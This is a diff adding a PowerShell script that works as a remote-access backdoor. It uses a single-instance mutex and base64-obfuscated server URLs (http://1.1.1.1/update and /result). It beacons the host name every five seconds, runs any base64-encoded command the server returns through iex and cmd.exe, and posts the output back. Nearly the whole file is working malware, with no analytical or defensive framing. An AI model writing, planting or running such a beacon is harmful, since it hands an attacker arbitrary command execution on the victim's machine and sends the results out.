@@ -1,0 +1,87 @@
+Set-StrictMode -Version 2
+
+function Decode-Base64 {
+    param(
+        [string]$EncodedString
+    )
+    $bytes = [System.Convert]::FromBase64String($EncodedString)
+    return [System.Text.Encoding]::UTF8.GetString($bytes)
+}
+
+function Encode-Base64 {
+    param(
+        [string]$PlainString
+    )
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($PlainString)
+    return [System.Convert]::ToBase64String($bytes)
+}
+
+function Invoke-WebRequestWithPayload {
+    param (
+        [string]$Url,
+        [string]$Payload,
+        [string]$Token,
+        [bool]$UseToken
+    )
+
+    $webClient = New-Object System.Net.WebClient
+    if($UseToken){
+        $webClient.Headers.Add("X-Token", $Token)
+    }
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
+    try {
+        $response = $webClient.UploadData($Url, "POST", $bytes)
+        return [System.Text.Encoding]::UTF8.GetString($response)
+    } catch {
+        return "NULL"
+    }
+}
+
+function CreatePayload {
+    param (
+        [string]$ID,
+        [string]$Host
+    )
+    $payloadObject = [PSCustomObject]@{
+        id = $ID
+        host = $Host
+    }
+    $jsonString = $payloadObject | ConvertTo-Json -Compress
+    return Encode-Base64 -PlainString $jsonString
+}
+
+$mutexName = "5BVfTf952yTaXKNTFLL"
+$mutex = New-Object System.Threading.Mutex($false, $mutexName)
+$isAnotherInstanceRunning = -not $mutex.WaitOne(0, $false)
+if ($isAnotherInstanceRunning) {
+    exit
+}
+
+while ($true) {
+    $computerName = $env:ComputerName
+    Start-Sleep -Seconds 5
+    $timestamp = (Get-Date -UFormat "%s").replace(".","").replace(",","")
+    $url = Decode-Base64 -EncodedString "aHR0cDovLzEuMS4xLjEvdXBkYXRl"
+    $payload = CreatePayload -ID $timestamp -Host $computerName
+    $response = Invoke-WebRequestWithPayload -Url $url -Payload $payload -Token $null -UseToken $false
+
+    if ($response -ne $null -and $response -ne "" -and $response -ne "NULL") {
+        $command = Decode-Base64 -EncodedString $response
+        $command = "cmd.exe /c $command"
+        $executionResult = iex $command 2>&1 | Out-String
+        
+        while ($true) {
+            $resultUrl = Decode-Base64 -EncodedString "aHR0cDovLzEuMS4xLjEvcmVzdWx0"
+            $encodedResult = Encode-Base64 -PlainString $executionResult
+            $resultResponse = Invoke-WebRequestWithPayload -Url $resultUrl -Payload $encodedResult -Token $timestamp -UseToken $true
+            
+            if ($resultResponse -ne "NULL") {
+                break
+            }
+        }
+    }
+    Start-Sleep -Seconds 5
+}
+
+$mutex.ReleaseMutex()
+$mutex.Close()
